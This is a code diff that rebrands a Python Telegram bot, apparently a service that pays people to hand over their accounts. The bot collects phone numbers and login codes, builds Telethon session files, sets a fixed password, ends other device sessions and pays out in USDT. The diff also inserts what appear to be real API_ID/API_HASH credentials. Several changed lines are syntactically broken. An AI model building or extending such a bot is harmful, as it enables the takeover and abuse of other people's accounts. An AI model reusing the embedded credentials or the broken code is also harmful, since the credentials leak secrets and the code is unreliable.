@@ -26,14 +26,14 @@ import requests
 
 # Configuration
 API_TOKEN = "আপনার বট টোকেন দিন "
-ADMIN_ID = 123456789  # এডমিন আইডি দিন
-API_ID = 1234567  # API_ID
-API_HASH = "your_api_hash_here"  # API_HASH
-SESSION_GROUP_ID = -1002845725805
-WITHDRAW_GROUP_ID = -1002741068000
-CHANNEL_URL = "https://t.me/tx_receivers_news"
+ADMIN_ID = 123456789  # ADMIN ID
+API_ID = 25403443  # API_ID
+API_HASH = "79908b532fe9662404142fd94bf494ec"  # API_HASH
+SESSION_GROUP_ID = -1003084355923
+WITHDRAW_GROUP_ID = -1002999572063
+CHANNEL_URL = "https://t.me/+9M4KaQILn7FhNDY1"
 CHANNEL_USERNAME = "@tx_receivers_news"
-SPAM_BOT = "@SpamBot"
+SPAM_BOT = "@telecatch"
 
 MIN_WITHDRAW = 2.0
 DB_FILE = "session_bot.db"
@@ -67,7 +67,7 @@ proxies = {
 
 # Helper function for fixed password
 def generate_random_password():
-    return "@Riyad12"
+    return "G112200"
 
 # Generate random device info
 def generate_random_device_info():
@@ -465,7 +465,7 @@ async def _generate_session_file(chat_id, phone, code, phone_code_hash, session_
             new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
             cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, chat_id))
         conn.commit()
-        bot.edit_message_text("❌ Account has spam restrictions. Cannot accept this account.", chat_id, processing_msg_id, parse_mode="Markdown")
+        bot.edit_message_text("❌ Account has spam restrictions. Cannot accept this {phone_number} account.", chat_id, processing_msg_id, parse_mode="Markdown")
     except Exception as e:
         logging.error(f"[CRITICAL ERROR for {chat_id}]: Login Error for {phone}: {e}")
         cursor.execute("SELECT pending_numbers FROM users WHERE user_id = ?", (chat_id,))
@@ -507,7 +507,10 @@ async def auto_claim_balance(user_id, phone_number, message_id, session_filename
                 new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                 cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
             conn.commit()
-            final_message = f"❗️ Account {phone_number} is not accessible. Please ensure you have logged out from all other devices."
+            final_message = f"❗️ Access Denied: Account {phone_number}\n\n"
+    "Please make sure you have logged out from all other devices.\n\n"
+    "⁉️ Important: You must log out from this device or any other device.\n"
+    "⚠️ We cannot accept this type of account for the verification process."
             bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
             return
 
@@ -533,7 +536,7 @@ async def auto_claim_balance(user_id, phone_number, message_id, session_filename
                 new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
                 cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
             conn.commit()
-            final_message = f"❗️ Balance claim failed. **{other_devices} other device(s)** remain active after termination attempt."
+            final_message = f"❗️ Balance added failed. **{other_devices} other device(s)** remain active after termination attempt."
             bot.edit_message_text(final_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
             return
 
@@ -596,7 +599,7 @@ async def auto_claim_balance(user_id, phone_number, message_id, session_filename
             new_pending_str = ",".join(pending_numbers) if pending_numbers else ""
             cursor.execute("UPDATE users SET pending_numbers = ? WHERE user_id = ?", (new_pending_str, user_id))
         conn.commit()
-        error_message = (f"❗️ Balance claim failed for `{phone_number}`.\n\n"
+        error_message = (f"❗️ Balance added failed for `{phone_number}`.\n\n"
                         f"**Reason:** `{e}`\n\n"
                         f"This is typically a temporary network issue. Your balance was not credited. Please contact support if this issue persists.")
         bot.edit_message_text(error_message, chat_id=user_id, message_id=message_id, parse_mode="Markdown", reply_markup=None)
@@ -653,7 +656,7 @@ def _format_quote_line(code, rate, claim_time):
     except:
         dial = ""
     flag = _flag_from_country(code)
-    return f"{flag} +{dial} | 💰 ${rate:.2f} | ⏰ {claim_time}s"
+    return f"```\n{flag} +{dial} | 💰 ${rate:.2f} | ⏰ {claim_time}s\n```"
 
 # Telegram bot handlers (General users)
 @bot.message_handler(commands=["start"])
@@ -666,9 +669,9 @@ def command_start(message):
     channel_join_required(send_welcome)(message)
 
 def send_welcome(message):
-    welcome_text = ("🎉 Welcome to the Session Management System\n\n"
+    welcome_text = ("🎉 Welcome to @TeleCatch bot\n\n"
                     "Please provide your phone number starting with the country code.\n"
-                    "Example: +228xxxxxxxx for Togo\n\n"
+                    "Example: +44xxxxxxxx for UK\n\n"
                     "Available Commands:\n"
                     "/capacity - View available countries and rates\n"
                     "/account - Check your account status\n"
@@ -757,11 +760,10 @@ def command_account(message):
         pending_count = len([n for n in pending_numbers.split(",") if n]) if pending_numbers else 0
         now = datetime.datetime.now()
         profile_text = ("📊 **Account Overview**\n\n"
-                        "🆔 **User ID:** {}\n\n"
+                        "🚻 **User ID:** {}\n\n"
                         "✅ **Verified Accounts:** {}\n"
-                        "⏳ **Pending Verification:** {}\n"
                         "💰 **Available Balance:** ${:.2f}\n\n"
-                        "📅 **Date:** {}\n"
+                        "🗓️ **Date:** {}\n"
                         "⏰ **Time:** {}\n\n"
                         "View your withdrawal history using:\n"
                         "`/withdrawhistory`").format(
@@ -789,8 +791,8 @@ def command_withdraw(message):
         bot.send_message(message.chat.id, f"❌ Withdrawal failed. Minimum withdrawal amount is ${MIN_WITHDRAW:.2f}. Your current balance is ${balance:.2f}.")
         return
     markup = types.InlineKeyboardMarkup()
-    ld_card_button = types.InlineKeyboardButton("💳 LD Card", callback_data="withdraw_ld_card")
-    usdt_button = types.InlineKeyboardButton("USDT (BP20)", callback_data="withdraw_usdt")
+    ld_card_button = types.InlineKeyboardButton("💳 Card", callback_data="withdraw_ld_card")
+    usdt_button = types.InlineKeyboardButton("USDT(BEP20)", callback_data="withdraw_usdt")
     markup.add(ld_card_button, usdt_button)
     bot.send_message(message.chat.id, "Please select your preferred withdrawal method:", reply_markup=markup)
 
@@ -847,7 +849,7 @@ def withdraw_callback_handler(call):
                 logging.info(f"[LOG] Successfully edited message for USDT: chat_id={chat_id}, message_id={message_id}")
             except Exception as e:
                 logging.error(f"[ERROR] Failed to edit message for USDT: {e}")
-                bot.send_message(chat_id, "Please provide your USDT wallet address (BEP-20 network):", parse_mode="Markdown")
+                bot.send_message(chat_id, "To continue, please enter your USDT wallet address on the BEP-20 network:", parse_mode="Markdown")
                 logging.info(f"[LOG] Sent new message as fallback for USDT: chat_id={chat_id}")
             bot.answer_callback_query(call.id)
         except Exception as e:
@@ -890,9 +892,10 @@ def text_message_handler(message):
             code = text
             if "code_msg_id" in data:
                 processing_msg_id = data["code_msg_id"]
-                bot.edit_message_text("⚙️ Processing your request, please wait...", chat_id, processing_msg_id)
+                bot.edit_message_text("♻️ Processing your request...\n
+⏳ Please wait while we complete the operation.", chat_id, processing_msg_id)
             else:
-                processing_msg = bot.send_message(chat_id, "⚙️ Processing your request, please wait...")
+                processing_msg = bot.send_message(chat_id, "🔐 Our Database Sending OTP, Kindly wait...")
                 processing_msg_id = processing_msg.message_id
             threading.Thread(target=run_telethon_task, args=[_generate_session_file, chat_id, phone, code, data["phone_code_hash"], data["session_filename"], processing_msg_id]).start()
             return
@@ -909,11 +912,11 @@ def text_message_handler(message):
                     data = user_data[chat_id]
                     code = text
                     try:
-                        bot.edit_message_text("⚙️ Processing your request, please wait...", chat_id, message.reply_to_message.message_id)
+                        bot.edit_message_text("♻️ Processing your request... /n ⏳ Please wait while we complete the operation.", chat_id, message.reply_to_message.message_id)
                         processing_msg_id = message.reply_to_message.message_id
                     except Exception as e:
                         logging.error(f"Error editing message: {e}")
-                        processing_msg = bot.reply_to(message, "⚙️ Processing your request, please wait...")
+                        processing_msg = bot.reply_to(message, "")
                         processing_msg_id = processing_msg.message_id
                     threading.Thread(target=run_telethon_task, args=[_generate_session_file, chat_id, phone, code, data["phone_code_hash"], data["session_filename"], processing_msg_id]).start()
                     return
@@ -938,7 +941,7 @@ def process_phone_number(message):
     conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     cursor = conn.cursor()
     if cursor.execute("SELECT 1 FROM used_numbers WHERE phone_number = ?", (phone_number,)).fetchone():
-        bot.send_message(chat_id, "❗️ This phone number has already been registered in our system.")
+        bot.send_message(chat_id, "❗️ This phone number has already been registered in our server.")
         conn.close()
         return
     country_code = get_country_info(phone_number)["code"]
@@ -995,7 +998,7 @@ def process_wallet_card_info(message):
                     f"- User ID: `{user_id}`\n"
                     f"- Username: `{user_username}`\n"
                     f"- Amount: ${amount:.2f}\n\n"
-                    f"📅 **Date:** {now.strftime('%d/%m/%Y')}\n"
+                    f"🗓️ **Date:** {now.strftime('%d/%m/%Y')}\n"
                     f"⏰ **Time:** {now.strftime('%I:%M %p')}\n\n"
                     f"✅ Your request has been forwarded for processing. Please allow 24-48 hours for completion.")
     try:
@@ -1030,7 +1033,7 @@ def process_wallet_card_info(message):
                 country_lines.append(f"+{dial_code} (Unknown) => {count}")
         if country_lines: country_counts_str = "\n".join(country_lines)
 
-    admin_notification = (f"🌳 **New Withdrawal Request**\n\n"
+    admin_notification = (f"👀 **New Withdrawal Request**\n\n"
                          f"📋 **User Information:**\n"
                          f"- Name: `{escape(user_name_from_tg)}`\n"
                          f"- ID: `{user_id}`\n"
